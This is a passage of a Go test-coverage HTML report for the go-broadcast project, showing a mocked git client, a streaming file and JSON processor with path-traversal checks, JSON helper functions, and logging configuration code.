func (m *MockClient) Checkout(ctx context.Context, repoPath, branch string) error <span class="cov8" title="1">{
        args := m.Called(ctx, repoPath, branch)
        return testutil.ExtractError(args)
}</span>

// CreateBranch mock implementation
func (m *MockClient) CreateBranch(ctx context.Context, repoPath, branch string) error <span class="cov8" title="1">{
        args := m.Called(ctx, repoPath, branch)
        return testutil.ExtractError(args)
}</span>

// Add mock implementation
func (m *MockClient) Add(ctx context.Context, repoPath string, paths ...string) error <span class="cov8" title="1">{
        args := m.Called(ctx, repoPath, paths)
        return testutil.ExtractError(args)
}</span>

// Commit mock implementation
func (m *MockClient) Commit(ctx context.Context, repoPath, message string) error <span class="cov8" title="1">{
        args := m.Called(ctx, repoPath, message)
        return testutil.ExtractError(args)
}</span>

// Push mock implementation
func (m *MockClient) Push(ctx context.Context, repoPath, remote, branch string, force bool) error <span class="cov8" title="1">{
        args := m.Called(ctx, repoPath, remote, branch, force)
        return testutil.ExtractError(args)
}</span>

// Diff mock implementation
func (m *MockClient) Diff(ctx context.Context, repoPath string, staged bool) (string, error) <span class="cov8" title="1">{
        args := m.Called(ctx, repoPath, staged)
        return testutil.ExtractStringResult(args)
}</span>

// GetCurrentBranch mock implementation
func (m *MockClient) GetCurrentBranch(ctx context.Context, repoPath string) (string, error) <span class="cov8" title="1">{
        args := m.Called(ctx, repoPath)
        return testutil.ExtractStringResult(args)
}</span>

// GetRemoteURL mock implementation
func (m *MockClient) GetRemoteURL(ctx context.Context, repoPath, remote string) (string, error) <span class="cov8" title="1">{
        args := m.Called(ctx, repoPath, remote)
        return testutil.ExtractStringResult(args)
}</span>

// AddRemote mock implementation
func (m *MockClient) AddRemote(ctx context.Context, repoPath, remoteName, remoteURL string) error <span class="cov0" title="0">{
        args := m.Called(ctx, repoPath, remoteName, remoteURL)
        return testutil.ExtractError(args)
}</span>

// GetCurrentCommitSHA mock implementation
func (m *MockClient) GetCurrentCommitSHA(ctx context.Context, repoPath string) (string, error) <span class="cov0" title="0">{
        args := m.Called(ctx, repoPath)
        return testutil.ExtractStringResult(args)
}</span>

// GetRepositoryInfo mock implementation
func (m *MockClient) GetRepositoryInfo(ctx context.Context, repoPath string) (*RepositoryInfo, error) <span class="cov0" title="0">{
        args := m.Called(ctx, repoPath)
        if args.Get(0) == nil </span><span class="cov0" title="0">{
                return nil, testutil.ExtractError(args)
        }</span>
        <span class="cov0" title="0">return args.Get(0).(*RepositoryInfo), testutil.ExtractError(args)</span>
}
</pre>

		<pre class="file" id="file35" style="display: none">package io

import (
        "bufio"
        "bytes"
        "context"
        "encoding/json"
        "errors"
        "fmt"
        "io"
        "os"
        "path/filepath"
        "runtime"
        "strings"
        "sync/atomic"
        "time"

        "github.com/mrz1836/go-broadcast/internal/pool"
)

// Stream processing errors
var (
        ErrInvalidJSONStructure = errors.New("expected JSON array or object")
        ErrPathTraversal        = errors.New("path traversal detected")
        ErrNullByteInPath       = errors.New("null byte detected in path")
)

// validatePath validates file paths to prevent directory traversal attacks
func validatePath(path string) error <span class="cov8" title="1">{
        // Clean the path to resolve . and .. elements
        cleanPath := filepath.Clean(path)

        // Check for path traversal attempts - looking for .. after cleaning
        if strings.Contains(cleanPath, "..") </span><span class="cov8" title="1">{
                return fmt.Errorf("%w: %s", ErrPathTraversal, path)
        }</span>

        // Check for null bytes which can be used to bypass filters
        <span class="cov8" title="1">if strings.Contains(path, "\x00") </span><span class="cov8" title="1">{
                return fmt.Errorf("%w: %s", ErrNullByteInPath, path)
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// StreamProcessor processes files and data in chunks without loading entire content into memory
type StreamProcessor struct {
        ChunkSize          int           // Size of chunks to read/write (default: 64KB)
        StreamingThreshold int           // File size threshold for streaming vs in-memory (default: 1MB)
        BufferTimeout      time.Duration // Timeout for buffer operations (default: 30s)

        // Statistics for monitoring
        stats struct {
                filesProcessed  int64
                bytesProcessed  int64
                streamingOps    int64
                inMemoryOps     int64
                chunksProcessed int64
                errorCount      int64
        }
}

// StreamingThresholds defines size limits for different processing modes
const (
        DefaultChunkSize          = 64 * 1024        // 64KB chunks - optimal for most file systems
        DefaultStreamingThreshold = 1024 * 1024      // 1MB - switch to streaming above this size
        MaxInMemorySize           = 10 * 1024 * 1024 // 10MB - absolute maximum for in-memory processing
        DefaultBufferTimeout      = 30 * time.Second
)

// NewStreamProcessor creates a new stream processor with optimized defaults
func NewStreamProcessor() *StreamProcessor <span class="cov8" title="1">{
        return &amp;StreamProcessor{
                ChunkSize:          DefaultChunkSize,
                StreamingThreshold: DefaultStreamingThreshold,
                BufferTimeout:      DefaultBufferTimeout,
        }
}</span>

// NewStreamProcessorWithConfig creates a stream processor with custom configuration
func NewStreamProcessorWithConfig(chunkSize, streamingThreshold int, timeout time.Duration) *StreamProcessor <span class="cov8" title="1">{
        // Validate and clamp configuration values
        if chunkSize &lt;= 0 || chunkSize &gt; pool.LargeBufferThreshold </span><span class="cov8" title="1">{
                chunkSize = DefaultChunkSize
        }</span>
        <span class="cov8" title="1">if streamingThreshold &lt;= 0 || streamingThreshold &gt; MaxInMemorySize </span><span class="cov8" title="1">{
                streamingThreshold = DefaultStreamingThreshold
        }</span>
        <span class="cov8" title="1">if timeout &lt;= 0 </span><span class="cov8" title="1">{
                timeout = DefaultBufferTimeout
        }</span>

        <span class="cov8" title="1">return &amp;StreamProcessor{
                ChunkSize:          chunkSize,
                StreamingThreshold: streamingThreshold,
                BufferTimeout:      timeout,
        }</span>
}

// TransformFunc represents a function that transforms data chunks
// It receives input data and returns transformed data and any error
type TransformFunc func([]byte) ([]byte, error)

// ProcessFile processes a file with the given transformation function
// Automatically chooses between streaming and in-memory processing based on file size
func (sp *StreamProcessor) ProcessFile(ctx context.Context, inputPath, outputPath string, transform TransformFunc) error <span class="cov8" title="1">{
        // Get file size to determine processing strategy
        fileInfo, err := os.Stat(inputPath)
        if err != nil </span><span class="cov8" title="1">{
                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                return fmt.Errorf("failed to stat input file %s: %w", inputPath, err)
        }</span>

        <span class="cov8" title="1">fileSize := fileInfo.Size()

        // Choose processing strategy based on file size
        if fileSize &lt;= int64(sp.StreamingThreshold) </span><span class="cov8" title="1">{
                atomic.AddInt64(&amp;sp.stats.inMemoryOps, 1)
                return sp.processFileInMemory(ctx, inputPath, outputPath, transform, fileSize)
        }</span>
        <span class="cov8" title="1">atomic.AddInt64(&amp;sp.stats.streamingOps, 1)
        return sp.processFileStreaming(ctx, inputPath, outputPath, transform, fileSize)</span>
}

// JSONStreamHandler represents a function that processes individual JSON objects
type JSONStreamHandler func(interface{}) error

// ProcessLargeJSON processes large JSON files without loading the entire content into memory
// This is particularly useful for GitHub API responses with many items (branches, PRs, etc.)
func (sp *StreamProcessor) ProcessLargeJSON(ctx context.Context, inputPath string, handler JSONStreamHandler) error <span class="cov8" title="1">{
        // Validate input path
        if err := validatePath(inputPath); err != nil </span><span class="cov8" title="1">{
                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                return fmt.Errorf("invalid input path: %w", err)
        }</span>

        <span class="cov8" title="1">file, err := os.Open(inputPath) //nolint:gosec // Opening file with user-provided path for streaming processing
        if err != nil </span><span class="cov8" title="1">{
                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                return fmt.Errorf("failed to open JSON file %s: %w", inputPath, err)
        }</span>
        <span class="cov8" title="1">defer func() </span><span class="cov8" title="1">{
                _ = file.Close()
        }</span>()

        // Get file size for statistics
        <span class="cov8" title="1">fileInfo, err := file.Stat()
        if err == nil </span><span class="cov8" title="1">{
                defer func() </span><span class="cov8" title="1">{
                        atomic.AddInt64(&amp;sp.stats.filesProcessed, 1)
                        atomic.AddInt64(&amp;sp.stats.bytesProcessed, fileInfo.Size())
                }</span>()
        }

        // Create buffered reader for optimal performance
        <span class="cov8" title="1">reader := bufio.NewReaderSize(file, sp.ChunkSize)
        decoder := json.NewDecoder(reader)

        // Read opening delimiter (array or object)
        token, err := decoder.Token()
        if err != nil </span><span class="cov8" title="1">{
                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                return fmt.Errorf("failed to read JSON opening token: %w", err)
        }</span>

        // Handle both JSON arrays and objects
        <span class="cov8" title="1">var isArray bool
        if delim, ok := token.(json.Delim); ok &amp;&amp; delim == '[' </span><span class="cov8" title="1">{
                isArray = true
        }</span> else<span class="cov8" title="1"> if delim, ok := token.(json.Delim); ok &amp;&amp; delim == '{' </span><span class="cov8" title="1">{
                isArray = false
        }</span> else<span class="cov8" title="1"> {
                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                return fmt.Errorf("%w: got %T", ErrInvalidJSONStructure, token)
        }</span>

        <span class="cov8" title="1">itemCount := int64(0)

        if isArray </span><span class="cov8" title="1">{
                // Process array elements one by one
                for decoder.More() </span><span class="cov8" title="1">{
                        // Check for context cancellation
                        select </span>{
                        case &lt;-ctx.Done():<span class="cov8" title="1">
                                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                                return ctx.Err()</span>
                        default:<span class="cov8" title="1"></span>
                        }

                        <span class="cov8" title="1">var item interface{}
                        if err := decoder.Decode(&amp;item); err != nil </span><span class="cov8" title="1">{
                                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                                return fmt.Errorf("failed to decode JSON item %d: %w", itemCount, err)
                        }</span>

                        <span class="cov8" title="1">if err := handler(item); err != nil </span><span class="cov8" title="1">{
                                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                                return fmt.Errorf("handler failed for item %d: %w", itemCount, err)
                        }</span>

                        <span class="cov8" title="1">itemCount++

                        // Yield to other goroutines occasionally to prevent blocking
                        if itemCount%100 == 0 </span><span class="cov0" title="0">{
                                runtime.Gosched()
                        }</span>
                }
        } else<span class="cov8" title="1"> {
                // Process object properties one by one
                for decoder.More() </span><span class="cov8" title="1">{
                        // Check for context cancellation
                        select </span>{
                        case &lt;-ctx.Done():<span class="cov0" title="0">
                                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                                return ctx.Err()</span>
                        default:<span class="cov8" title="1"></span>
                        }

                        // Read property name
                        <span class="cov8" title="1">keyToken, err := decoder.Token()
                        if err != nil </span><span class="cov8" title="1">{
                                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                                return fmt.Errorf("failed to read property key: %w", err)
                        }</span>

                        // Read property value
                        <span class="cov8" title="1">var value interface{}
                        if err := decoder.Decode(&amp;value); err != nil </span><span class="cov8" title="1">{
                                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                                return fmt.Errorf("failed to decode property value: %w", err)
                        }</span>

                        // Create property object for handler
                        <span class="cov8" title="1">property := map[string]interface{}{
                                keyToken.(string): value,
                        }

                        if err := handler(property); err != nil </span><span class="cov8" title="1">{
                                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                                return fmt.Errorf("handler failed for property %s: %w", keyToken, err)
                        }</span>

                        <span class="cov8" title="1">itemCount++

                        // Yield to other goroutines occasionally
                        if itemCount%100 == 0 </span><span class="cov0" title="0">{
                                runtime.Gosched()
                        }</span>
                }
        }

        // Read closing delimiter
        <span class="cov8" title="1">if _, err := decoder.Token(); err != nil </span><span class="cov8" title="1">{
                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                return fmt.Errorf("failed to read JSON closing token: %w", err)
        }</span>

        <span class="cov8" title="1">atomic.AddInt64(&amp;sp.stats.streamingOps, 1)

        return nil</span>
}

// BatchFileProcessor handles multiple file operations efficiently
type BatchFileProcessor struct {
        processor    *StreamProcessor
        maxBatchSize int
        batchTimeout time.Duration
}

// NewBatchFileProcessor creates a new batch file processor
func NewBatchFileProcessor(processor *StreamProcessor, maxBatchSize int, batchTimeout time.Duration) *BatchFileProcessor <span class="cov8" title="1">{
        if maxBatchSize &lt;= 0 </span><span class="cov8" title="1">{
                maxBatchSize = 100 // Default batch size
        }</span>
        <span class="cov8" title="1">if batchTimeout &lt;= 0 </span><span class="cov8" title="1">{
                batchTimeout = 5 * time.Minute // Default timeout
        }</span>

        <span class="cov8" title="1">return &amp;BatchFileProcessor{
                processor:    processor,
                maxBatchSize: maxBatchSize,
                batchTimeout: batchTimeout,
        }</span>
}

// FileOperation represents a single file processing operation
type FileOperation struct {
        InputPath  string
        OutputPath string
        Transform  TransformFunc
}

// ProcessBatch processes multiple files efficiently
func (bfp *BatchFileProcessor) ProcessBatch(ctx context.Context, operations []FileOperation) error <span class="cov8" title="1">{
        if len(operations) == 0 </span><span class="cov8" title="1">{
                return nil
        }</span>

        // Process in batches to manage memory usage
        <span class="cov8" title="1">for i := 0; i &lt; len(operations); i += bfp.maxBatchSize </span><span class="cov8" title="1">{
                end := i + bfp.maxBatchSize
                if end &gt; len(operations) </span><span class="cov8" title="1">{
                        end = len(operations)
                }</span>

                <span class="cov8" title="1">batch := operations[i:end]

                // Create batch context with timeout
                batchCtx, cancel := context.WithTimeout(ctx, bfp.batchTimeout)

                // Process batch
                batchErr := bfp.processBatch(batchCtx, batch)
                cancel()

                if batchErr != nil </span><span class="cov8" title="1">{
                        return fmt.Errorf("batch processing failed at batch starting index %d: %w", i, batchErr)
                }</span>

                // Check for context cancellation between batches
                <span class="cov8" title="1">select </span>{
                case &lt;-ctx.Done():<span class="cov8" title="1">
                        return ctx.Err()</span>
                default:<span class="cov8" title="1"></span>
                }
        }

        <span class="cov8" title="1">return nil</span>
}

// processBatch handles a single batch of file operations
func (bfp *BatchFileProcessor) processBatch(ctx context.Context, batch []FileOperation) error <span class="cov8" title="1">{
        for i, op := range batch </span><span class="cov8" title="1">{
                if err := bfp.processor.ProcessFile(ctx, op.InputPath, op.OutputPath, op.Transform); err != nil </span><span class="cov8" title="1">{
                        return fmt.Errorf("operation %d failed (input: %s, output: %s): %w", i, op.InputPath, op.OutputPath, err)
                }</span>
        }
        <span class="cov8" title="1">return nil</span>
}

// StreamingStats contains statistics about streaming operations
type StreamingStats struct {
        FilesProcessed  int64   `json:"files_processed"`
        BytesProcessed  int64   `json:"bytes_processed"`
        StreamingOps    int64   `json:"streaming_operations"`
        InMemoryOps     int64   `json:"in_memory_operations"`
        ChunksProcessed int64   `json:"chunks_processed"`
        ErrorCount      int64   `json:"error_count"`
        StreamingRatio  float64 `json:"streaming_ratio"` // Percentage of operations that used streaming
}

// GetStats returns current streaming statistics
func (sp *StreamProcessor) GetStats() StreamingStats <span class="cov8" title="1">{
        filesProcessed := atomic.LoadInt64(&amp;sp.stats.filesProcessed)
        bytesProcessed := atomic.LoadInt64(&amp;sp.stats.bytesProcessed)
        streamingOps := atomic.LoadInt64(&amp;sp.stats.streamingOps)
        inMemoryOps := atomic.LoadInt64(&amp;sp.stats.inMemoryOps)
        chunksProcessed := atomic.LoadInt64(&amp;sp.stats.chunksProcessed)
        errorCount := atomic.LoadInt64(&amp;sp.stats.errorCount)

        totalOps := streamingOps + inMemoryOps
        var streamingRatio float64
        if totalOps &gt; 0 </span><span class="cov8" title="1">{
                streamingRatio = float64(streamingOps) / float64(totalOps) * 100
        }</span>

        <span class="cov8" title="1">return StreamingStats{
                FilesProcessed:  filesProcessed,
                BytesProcessed:  bytesProcessed,
                StreamingOps:    streamingOps,
                InMemoryOps:     inMemoryOps,
                ChunksProcessed: chunksProcessed,
                ErrorCount:      errorCount,
                StreamingRatio:  streamingRatio,
        }</span>
}

// ResetStats resets all streaming statistics to zero
func (sp *StreamProcessor) ResetStats() <span class="cov8" title="1">{
        atomic.StoreInt64(&amp;sp.stats.filesProcessed, 0)
        atomic.StoreInt64(&amp;sp.stats.bytesProcessed, 0)
        atomic.StoreInt64(&amp;sp.stats.streamingOps, 0)
        atomic.StoreInt64(&amp;sp.stats.inMemoryOps, 0)
        atomic.StoreInt64(&amp;sp.stats.chunksProcessed, 0)
        atomic.StoreInt64(&amp;sp.stats.errorCount, 0)
}</span>

// processFileInMemory handles small files entirely in memory for maximum performance
func (sp *StreamProcessor) processFileInMemory(_ context.Context, inputPath, outputPath string, transform TransformFunc, fileSize int64) error <span class="cov8" title="1">{
        // Use buffer pool for efficient memory management
        bufferSize := pool.EstimateBufferSize("file_content", int(fileSize))

        result, err := pool.WithBufferResult[[]byte](bufferSize, func(_ *bytes.Buffer) ([]byte, error) </span><span class="cov8" title="1">{
                // Validate input path
                if err := validatePath(inputPath); err != nil </span><span class="cov8" title="1">{
                        return nil, fmt.Errorf("invalid input path: %w", err)
                }</span>

                // Read entire file
                <span class="cov8" title="1">content, err := os.ReadFile(inputPath) //nolint:gosec // Reading file with user-provided path for processing
                if err != nil </span><span class="cov0" title="0">{
                        return nil, fmt.Errorf("failed to read file %s: %w", inputPath, err)
                }</span>

                // Apply transformation
                <span class="cov8" title="1">transformed, err := transform(content)
                if err != nil </span><span class="cov8" title="1">{
                        return nil, fmt.Errorf("transformation failed: %w", err)
                }</span>

                // Copy result to avoid returning buffer pool memory
                <span class="cov8" title="1">result := make([]byte, len(transformed))
                copy(result, transformed)
                return result, nil</span>
        })
        <span class="cov8" title="1">if err != nil </span><span class="cov8" title="1">{
                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                return err
        }</span>

        // Validate output path
        <span class="cov8" title="1">if err := validatePath(outputPath); err != nil </span><span class="cov8" title="1">{
                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                return fmt.Errorf("invalid output path: %w", err)
        }</span>

        // Write result to output file
        <span class="cov8" title="1">if err := os.WriteFile(outputPath, result, 0o600); err != nil </span><span class="cov8" title="1">{
                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                return fmt.Errorf("failed to write output file %s: %w", outputPath, err)
        }</span>

        <span class="cov8" title="1">atomic.AddInt64(&amp;sp.stats.filesProcessed, 1)
        atomic.AddInt64(&amp;sp.stats.bytesProcessed, fileSize)

        return nil</span>
}

// processFileStreaming handles large files using streaming I/O to minimize memory usage
func (sp *StreamProcessor) processFileStreaming(ctx context.Context, inputPath, outputPath string, transform TransformFunc, _ int64) error <span class="cov8" title="1">{
        // Validate paths
        if err := validatePath(inputPath); err != nil </span><span class="cov8" title="1">{
                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                return fmt.Errorf("invalid input path: %w", err)
        }</span>
        <span class="cov8" title="1">if err := validatePath(outputPath); err != nil </span><span class="cov8" title="1">{
                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                return fmt.Errorf("invalid output path: %w", err)
        }</span>

        // Open input file
        <span class="cov8" title="1">input, err := os.Open(inputPath) //nolint:gosec // Opening file with user-provided path for streaming processing
        if err != nil </span><span class="cov8" title="1">{
                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                return fmt.Errorf("failed to open input file %s: %w", inputPath, err)
        }</span>
        <span class="cov8" title="1">defer func() </span><span class="cov8" title="1">{
                _ = input.Close()
        }</span>()

        // Create output file
        <span class="cov8" title="1">output, err := os.Create(outputPath) //nolint:gosec // Creating output file with user-provided path
        if err != nil </span><span class="cov8" title="1">{
                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                return fmt.Errorf("failed to create output file %s: %w", outputPath, err)
        }</span>
        <span class="cov8" title="1">defer func() </span><span class="cov8" title="1">{
                if cerr := output.Close(); cerr != nil &amp;&amp; err == nil </span><span class="cov0" title="0">{
                        err = cerr
                }</span>
        }()

        // Create buffered readers and writers for optimal performance
        <span class="cov8" title="1">reader := bufio.NewReaderSize(input, sp.ChunkSize)
        writer := bufio.NewWriterSize(output, sp.ChunkSize)
        defer func() </span><span class="cov8" title="1">{
                if ferr := writer.Flush(); ferr != nil &amp;&amp; err == nil </span><span class="cov0" title="0">{
                        err = ferr
                }</span>
        }()

        // Process file in chunks
        <span class="cov8" title="1">chunk := make([]byte, sp.ChunkSize)
        var totalBytesProcessed int64

        for </span><span class="cov8" title="1">{
                // Check for context cancellation
                select </span>{
                case &lt;-ctx.Done():<span class="cov8" title="1">
                        atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                        return ctx.Err()</span>
                default:<span class="cov8" title="1"></span>
                }

                // Read chunk
                <span class="cov8" title="1">n, readErr := reader.Read(chunk)
                if n &gt; 0 </span><span class="cov8" title="1">{
                        // Apply transformation to chunk
                        transformed, transformErr := transform(chunk[:n])
                        if transformErr != nil </span><span class="cov8" title="1">{
                                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                                return fmt.Errorf("transformation failed at offset %d: %w", totalBytesProcessed, transformErr)
                        }</span>

                        // Write transformed chunk
                        <span class="cov8" title="1">if _, writeErr := writer.Write(transformed); writeErr != nil </span><span class="cov0" title="0">{
                                atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                                return fmt.Errorf("failed to write at offset %d: %w", totalBytesProcessed, writeErr)
                        }</span>

                        <span class="cov8" title="1">totalBytesProcessed += int64(n)
                        atomic.AddInt64(&amp;sp.stats.chunksProcessed, 1)</span>
                }

                // Check for end of file
                <span class="cov8" title="1">if readErr == io.EOF </span><span class="cov8" title="1">{
                        break</span>
                }
                <span class="cov8" title="1">if readErr != nil </span><span class="cov0" title="0">{
                        atomic.AddInt64(&amp;sp.stats.errorCount, 1)
                        return fmt.Errorf("failed to read at offset %d: %w", totalBytesProcessed, readErr)
                }</span>
        }

        <span class="cov8" title="1">atomic.AddInt64(&amp;sp.stats.filesProcessed, 1)
        atomic.AddInt64(&amp;sp.stats.bytesProcessed, totalBytesProcessed)

        return nil</span>
}
</pre>

		<pre class="file" id="file36" style="display: none">// Package jsonutil provides type-safe JSON utilities with standardized error handling.
// This package consolidates JSON processing patterns to reduce code duplication
// across the go-broadcast codebase.
package jsonutil

import (
        "encoding/json"
        "errors"
        "fmt"

        appErrors "github.com/mrz1836/go-broadcast/internal/errors"
)

// MarshalJSON marshals any type to JSON with standardized error handling.
// It provides a type-safe wrapper around json.Marshal with consistent error messages.
func MarshalJSON[T any](v T) ([]byte, error) <span class="cov8" title="1">{
        data, err := json.Marshal(v)
        if err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, "marshal to JSON")
        }</span>
        <span class="cov8" title="1">return data, nil</span>
}

// UnmarshalJSON unmarshals JSON data to any type with standardized error handling.
// It provides a type-safe wrapper around json.Unmarshal with consistent error messages.
func UnmarshalJSON[T any](data []byte) (T, error) <span class="cov8" title="1">{
        var result T
        err := json.Unmarshal(data, &amp;result)
        if err != nil </span><span class="cov8" title="1">{
                return result, appErrors.WrapWithContext(err, "unmarshal JSON")
        }</span>
        <span class="cov8" title="1">return result, nil</span>
}

// Static error for invalid count
var errNegativeCount = errors.New("count must be non-negative")

// GenerateTestJSON creates test JSON data for benchmarks and tests.
// It generates an array of count items based on the provided template.
// This is useful for creating consistent test data across benchmark tests.
func GenerateTestJSON(count int, template interface{}) ([]byte, error) <span class="cov8" title="1">{
        if count &lt; 0 </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("%w: got %d", errNegativeCount, count)
        }</span>

        <span class="cov8" title="1">items := make([]interface{}, count)
        for i := 0; i &lt; count; i++ </span><span class="cov8" title="1">{
                items[i] = template
        }</span>

        <span class="cov8" title="1">data, err := json.Marshal(items)
        if err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, "generate test JSON")
        }</span>
        <span class="cov8" title="1">return data, nil</span>
}

// PrettyPrint formats JSON for human-readable output with proper indentation.
// It returns a formatted string representation of the provided value.
func PrettyPrint(v interface{}) (string, error) <span class="cov8" title="1">{
        data, err := json.MarshalIndent(v, "", "  ")
        if err != nil </span><span class="cov8" title="1">{
                return "", appErrors.WrapWithContext(err, "pretty print JSON")
        }</span>
        <span class="cov8" title="1">return string(data), nil</span>
}

// CompactJSON removes unnecessary whitespace from JSON data.
// This is useful for minimizing JSON size for storage or transmission.
func CompactJSON(data []byte) ([]byte, error) <span class="cov8" title="1">{
        var v interface{}
        if err := json.Unmarshal(data, &amp;v); err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, "parse JSON for compaction")
        }</span>

        <span class="cov8" title="1">compact, err := json.Marshal(v)
        if err != nil </span><span class="cov0" title="0">{
                return nil, appErrors.WrapWithContext(err, "compact JSON")
        }</span>
        <span class="cov8" title="1">return compact, nil</span>
}

// MergeJSON merges multiple JSON objects into a single object.
// Later values override earlier values for the same keys.
// All inputs must be valid JSON objects (not arrays or primitives).
func MergeJSON(jsons ...[]byte) ([]byte, error) <span class="cov8" title="1">{
        result := make(map[string]interface{})

        for i, data := range jsons </span><span class="cov8" title="1">{
                var obj map[string]interface{}
                if err := json.Unmarshal(data, &amp;obj); err != nil </span><span class="cov8" title="1">{
                        return nil, fmt.Errorf("failed to unmarshal JSON at index %d: %w", i, err)
                }</span>

                // Merge the object into result
                <span class="cov8" title="1">for k, v := range obj </span><span class="cov8" title="1">{
                        result[k] = v
                }</span>
        }

        <span class="cov8" title="1">merged, err := json.Marshal(result)
        if err != nil </span><span class="cov0" title="0">{
                return nil, appErrors.WrapWithContext(err, "marshal merged JSON")
        }</span>
        <span class="cov8" title="1">return merged, nil</span>
}
</pre>

		<pre class="file" id="file37" style="display: none">// Package logging provides logging configuration types and utilities.
//
// This package defines the logging configuration structures used throughout
// the application to enable component-specific debug logging and verbose
// output control. It avoids import cycles by being a leaf dependency.
package logging

import (
        "crypto/rand"
        "encoding/hex"
)

// LogConfig holds all logging and CLI configuration.
//
// This configuration is passed via dependency injection throughout the
// application to avoid global state and enable better testing isolation.
type LogConfig struct {
        ConfigFile    string
        DryRun        bool
        LogLevel      string
        Verbose       int // -v, -vv, -vvv support
        Debug         DebugFlags
        LogFormat     string   // "text" or "json"
        CorrelationID string   // Unique ID for request correlation
        JSONOutput    bool     // Enable JSON structured output
        GroupFilter   []string // Groups to sync (by name or ID)
        SkipGroups    []string // Groups to skip during sync
}

// DebugFlags contains component-specific debug flags for targeted troubleshooting.
//
// Each flag enables detailed logging for a specific component:
// - Git: Git command execution, timing, and output
// - API: GitHub API requests, responses, and timing
// - Transform: File transformation details and variable substitution
// - Config: Configuration loading and validation
// - State: State discovery and management operations
type DebugFlags struct {
        Git       bool // --debug-git flag
        API       bool // --debug-api flag
        Transform bool // --debug-transform flag
        Config    bool // --debug-config flag
        State     bool // --debug-state flag
}

// GenerateCorrelationID creates a unique correlation ID for request tracing.
//
// Returns a 16-byte hex-encoded string that can be used to correlate
// log entries across different components for the same operation.
func GenerateCorrelationID() string <span class="cov8" title="1">{
        bytes := make([]byte, 8)
        if _, err := rand.Read(bytes); err != nil </span><span class="cov0" title="0">{
                // Fallback to a simple timestamp-based ID if crypto/rand fails
                return "fallback-id"
        }</span>
        <span class="cov8" title="1">return hex.EncodeToString(bytes)</span>
}

// WithCorrelationID creates a new LogConfig with the specified correlation ID.
//
// This is useful for creating child contexts that inherit the parent's
// correlation ID for cross-component operation tracing.
func (lc *LogConfig) WithCorrelationID(correlationID string) *LogConfig <span class="cov8" title="1">{
        if lc == nil </span><span class="cov8" title="1">{
                return &amp;LogConfig{CorrelationID: correlationID}
        }</span>

        <span class="cov8" title="1">newConfig := *lc
        newConfig.CorrelationID = correlationID
        return &amp;newConfig</span>
}
</pre>

		<pre class="file" id="file38" style="display: none">// Package logging provides logging configuration types and utilities.
package logging

import (
        "fmt"
        "time"

        "github.com/sirupsen/logrus"

        "github.com/mrz1836/go-broadcast/internal/jsonutil"
)

// StructuredFormatter provides JSON output formatting for structured logging.
//
// This formatter ensures consistent JSON output with standardized field names
// and proper correlation ID inclusion for log aggregation systems.
type StructuredFormatter struct {
        // DisableTimestamp disables automatic timestamp generation
        DisableTimestamp bool
        // TimestampFormat sets the format for the timestamp field
        TimestampFormat string
}

// NewStructuredFormatter creates a new StructuredFormatter with default settings.
//
// The formatter uses RFC3339 timestamp format by default and includes
// all logrus fields in the JSON output.
func NewStructuredFormatter() *StructuredFormatter <span class="cov8" title="1">{
        return &amp;StructuredFormatter{
                TimestampFormat: time.RFC3339,
        }
}</span>

// Format formats a logrus.Entry as JSON with standardized fields.
//
// The formatter automatically includes correlation_id if present in the
// LogConfig and ensures all field names follow the StandardFields schema.
func (f *StructuredFormatter) Format(entry *logrus.Entry) ([]byte, error) <span class="cov8" title="1">{
        data := make(logrus.Fields)

        // Copy all fields from the entry
        for k, v := range entry.Data </span><span class="cov8" title="1">{
                data[k] = v
        }</span>

        // Add standard fields
        <span class="cov8" title="1">data["level"] = entry.Level.String()
        data["message"] = entry.Message

        // Add timestamp if not disabled
        if !f.DisableTimestamp </span><span class="cov8" title="1">{
                timestampFormat := f.TimestampFormat
                if timestampFormat == "" </span><span class="cov0" title="0">{
                        timestampFormat = time.RFC3339
                }</span>
                <span class="cov8" title="1">data[StandardFields.Timestamp] = entry.Time.Format(timestampFormat)</span>
        }

        // Serialize to JSON
        <span class="cov8" title="1">jsonBytes, err := jsonutil.MarshalJSON(data)
        if err != nil </span><span class="cov0" title="0">{
                return nil, err // Error already wrapped by jsonutil
        }</span>

        // Add newline for proper log formatting
        <span class="cov8" title="1">jsonBytes = append(jsonBytes, '\n')

        return jsonBytes, nil</span>
}

// ConfigureLogger configures a logrus.Logger instance based on LogConfig settings.
//
// This function sets up the appropriate formatter (JSON or text), log level,
// and any other logging configuration based on the provided LogConfig.
func ConfigureLogger(logger *logrus.Logger, config *LogConfig) error <span class="cov8" title="1">{
        if config == nil </span><span class="cov0" title="0">{
                return nil
        }</span>

        // Set log level - verbose flags override explicit log level
        <span class="cov8" title="1">var level logrus.Level
        var err error

        if config.Verbose &gt; 0 </span><span class="cov8" title="1">{
                // Map verbose level to logrus level
                switch config.Verbose </span>{
                case 1:<span class="cov8" title="1">
                        level = logrus.DebugLevel</span>
                case 2:<span class="cov8" title="1">
                        level = logrus.TraceLevel</span>
                default:<span class="cov8" title="1"> // 3 or higher
                        level = logrus.TraceLevel</span>
                }
